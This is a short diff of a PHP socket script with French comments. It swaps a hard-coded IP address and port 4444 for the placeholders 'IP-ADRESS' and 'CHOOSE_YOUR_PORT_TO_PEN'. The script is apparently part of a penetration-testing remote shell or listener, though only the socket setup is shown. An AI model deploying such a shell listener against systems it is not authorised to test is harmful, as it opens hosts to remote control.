@@ -48,8 +48,8 @@ function sendArray($client,$output){
 
 $procStatus = NULL;
 
-$address = "10.33.2.120"; //gethostname(); // ip de la machine
-$port = 4444;  // port ouvert
+$address = "IP-ADRESS"; //gethostname(); // ip de la machine
+$port = CHOOSE_YOUR_PORT_TO_PEN;  // port ouvert
 
 // creation socket avec AF_INET et TCP
 if (($sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) {
